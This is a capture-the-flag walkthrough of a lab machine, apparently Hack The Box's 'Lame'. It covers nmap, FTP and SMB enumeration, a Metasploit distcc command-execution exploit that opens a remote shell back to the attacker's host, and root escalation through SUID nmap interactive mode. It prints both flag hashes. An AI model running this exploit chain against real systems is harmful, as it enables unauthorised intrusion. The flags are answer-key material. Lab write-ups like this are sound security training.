Started of with a traditional nmap scan

```diff
nmap -A -p- -T4 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 06:35 EDT
Nmap scan report for 10.10.10.3
Host is up (0.18s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 2.3.4
22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn?
445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd      distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.4.7 (92%), Linksys WRV54G WAP (91%), Linux 2.6.23 (90%), Linux 2.6.8 - 2.6.30 (90%), Arris TG562G/CT cable modem (88%), Dell Integrated Remote Access Controller (iDRAC6) (88%), Linux 2.4.21 - 2.4.31 (likely embedded) (88%), Dell iDRAC 6 remote access controller (Linux 2.6) (88%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (88%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: 27s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   173.34 ms 10.10.14.1
2   174.42 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 576.99 seconds
```

Initially the FTP service running on port 21 and SMB on port 445 looked interesting. So I decided to go with the FTP service first.

```diff
ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:whitedevil): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56228|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||34003|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||24695|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
```

Looks like nothing is hosted here. So next I proceeded with SMB.

```diff
 smbclient -L \\\\10.10.10.3\\tmp
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
tmp looked very interesting

```diff
smbclient  \\\\10.10.10.3\\tmp                                                                                                                                                                                                       
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 29 07:03:31 2024
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  orbit-makis                        DR        0  Mon Jul 29 06:25:31 2024
  5583.jsvc_up                        R        0  Mon Jul 29 01:38:06 2024
  tffwp                               N        0  Mon Jul 29 02:10:52 2024
  .ICE-unix                          DH        0  Mon Jul 29 01:37:04 2024
  vmware-root                        DR        0  Mon Jul 29 01:37:28 2024
  .X11-unix                          DH        0  Mon Jul 29 01:37:30 2024
  gconfd-makis                       DR        0  Mon Jul 29 06:25:31 2024
  .X0-lock                           HR       11  Mon Jul 29 01:37:29 2024
  fqpsvsf                             N        0  Mon Jul 29 06:34:32 2024
  judn                                N        0  Mon Jul 29 06:39:14 2024
  vgauthsvclog.txt.0                  R     1600  Mon Jul 29 01:37:03 2024

                7282168 blocks of size 1024. 5383632 blocks available

smb: \> get vgauthsvclog.txt.0
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

Tried navigating to the other directories within the smb share, but got an "Access Denied" error

Taking a look into vgauthsvclog.txt.0  
```diff
cat vgauthsvclog.txt.0                                                                                                                                                                                                                  
[Jul 29 01:37:03.150] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jul 29 01:37:03.151] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jul 29 01:37:03.151] [ message] [VGAuthService] Group 'service'
[Jul 29 01:37:03.151] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jul 29 01:37:03.151] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jul 29 01:37:03.231] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Jul 29 01:37:03.231] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Jul 29 01:37:03.231] [ message] [VGAuthService] Group 'service'
[Jul 29 01:37:03.231] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Jul 29 01:37:03.231] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Jul 29 01:37:03.231] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Jul 29 01:37:03.231] [ message] [VGAuthService] INIT SERVICE
[Jul 29 01:37:03.231] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Jul 29 01:37:03.267] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Jul 29 01:37:03.302] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Jul 29 01:37:03.302] [ message] [VGAuthService] BEGIN SERVICE
```

Again nothing interesting here. I was kind of stuck here a for a while before trying to figure out what the distccd service found during the nmap scan was

What distccd?

From a quick google search found that distcc is a tool for speeding up compilation of source code by using distributed computing over a computer network. With the right configuration, distcc can dramatically reduce a project's compilation time.

Further going down the rabbit hole I discovered that this service was vulnerable to a command execution vulnerability and Metasploit had exploit module for the same

```diff
msf6 > use exploit/unix/misc/distcc_exec                                                                                                                                                                                                
[*] No payload configured, defaulting to cmd/unix/reverse_bash                                                                                                                                                                              
msf6 exploit(unix/misc/distcc_exec) > options
                                                                                                                                                                                                                                            
Module options (exploit/unix/misc/distcc_exec):                                                                                                                                                                                             
                                                                                                                                                                                                                                            
   Name     Current Setting  Required  Description                                                                                                                                                                                          
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.75.130   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3

msf6 exploit(unix/misc/distcc_exec) > set lhost tun0
lhost => 10.10.14.109

View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/bind_perl
payload => cmd/unix/bind_perl
```

Changed the RHOSTS and LHOST. The payload was throwing errors so tried changing the payload too. The default RPORT was set correctly so need not change that.

```diff
msf6 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP handler on 10.10.14.109:4444 
[*] Command shell session 2 opened (10.10.14.109:4444 -> 10.10.10.3:42344) at 2024-07-29 07:45:17 -0400

ls 
5583.jsvc_up
fqpsvsf
gconfd-makis
judn
orbit-makis
tffwp
vgauthsvclog.txt.0
vmware-root
zrolwez
```

Nice!! Got a shell. But this shell was restrictive. I was unable to navigate out of the tmp directory. 
By using the ls command repetitively I found the directory /home/makis which had the user.txt

```diff
ls /home
ftp
makis
service
user
ls /home/makis
user.txt
cat /home/makis/user.txt
d9986f224841ebb0bb54f1e76a10933b
```

Now for privelege escalation I started of by listing the binaries woth SUID permissions
```diff
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
 16466   68 -rwsr-xr-x   1 root     root        63584 Apr 14  2008 /bin/umount
 16449   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount
 16398   28 -rwsr-xr-x   1 root     root        25540 Apr  2  2008 /bin/su
 16418   84 -rwsr-xr-x   1 root     root        81368 Apr 14  2008 /bin/mount
 16427   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping
 16457   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6
  8370   68 -rwsr-xr-x   1 root     root        65520 Dec  2  2008 /sbin/mount.nfs
304747    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudoedit
344440    8 -rwsr-sr-x   1 root     root         7460 Jun 25  2008 /usr/bin/X
344958   12 -rwsr-xr-x   1 root     root         8524 Nov 22  2007 /usr/bin/netkit-rsh
344139   40 -rwsr-xr-x   1 root     root        37360 Apr  2  2008 /usr/bin/gpasswd
344317   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudo
344959   12 -rwsr-xr-x   1 root     root        12020 Nov 22  2007 /usr/bin/netkit-rlogin
344230   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping
344231   40 -rwsr-sr-x   1 daemon   daemon      38464 Feb 20  2007 /usr/bin/at
344365   20 -rwsr-xr-x   1 root     root        19144 Apr  2  2008 /usr/bin/newgrp
344429   28 -rwsr-xr-x   1 root     root        28624 Apr  2  2008 /usr/bin/chfn
344956  768 -rwsr-xr-x   1 root     root       780676 Apr  8  2008 /usr/bin/nmap
344441   24 -rwsr-xr-x   1 root     root        23952 Apr  2  2008 /usr/bin/chsh
344957   16 -rwsr-xr-x   1 root     root        15952 Nov 22  2007 /usr/bin/netkit-rcp
344771   32 -rwsr-xr-x   1 root     root        29104 Apr  2  2008 /usr/bin/passwd
344792   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr
354632   16 -rwsr-sr-x   1 libuuid  libuuid     12336 Mar 27  2008 /usr/sbin/uuidd
354626  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd
369987    8 -rwsr-xr--   1 root     telnetd      6040 Dec 17  2006 /usr/lib/telnetlogin
385106   12 -rwsr-xr--   1 root     www-data    10276 Mar  9  2010 /usr/lib/apache2/suexec
386116    8 -rwsr-xr-x   1 root     root         4524 Nov  5  2007 /usr/lib/eject/dmcrypt-get-device
377149  168 -rwsr-xr-x   1 root     root       165748 Apr  6  2008 /usr/lib/openssh/ssh-keysign
371390   12 -rwsr-xr-x   1 root     root         9624 Aug 17  2009 /usr/lib/pt_chown
 8415   16 -r-sr-xr-x   1 root     root        14320 Nov  3  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
16687   12 -r-sr-xr-x   1 root     root         9532 Nov  3  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
```

The output shows NMAP having SUID permission. Now that is not good, this could be exploited for privelege escalation.

```diff
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
cd /root
cat root.txt
4fd2d5a7d45355e5bef2ccfd6dbdad0d
```

And there we have both the user.txt and root.txt